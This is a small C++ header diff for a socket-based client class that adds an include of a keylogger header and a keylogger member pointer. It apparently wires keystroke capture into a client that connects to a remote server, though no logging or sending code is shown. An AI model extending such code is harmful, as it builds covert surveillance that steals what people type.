@@ -9,6 +9,7 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 #include <errno.h>
+#include "clkeylogger.hpp"
 #include "cldata_handler.hpp"
 #include "common.hpp"
 #include "client_macros.hpp"
@@ -30,6 +31,8 @@ private:
     bool shutdown_flag_ = false;
     bool retry_flag_ = false;
     struct sockaddr_in server_addr_;
+
+    CLKeylogger* keylogger_ = nullptr;
 };
 
 #endif // CLIENT_HPP
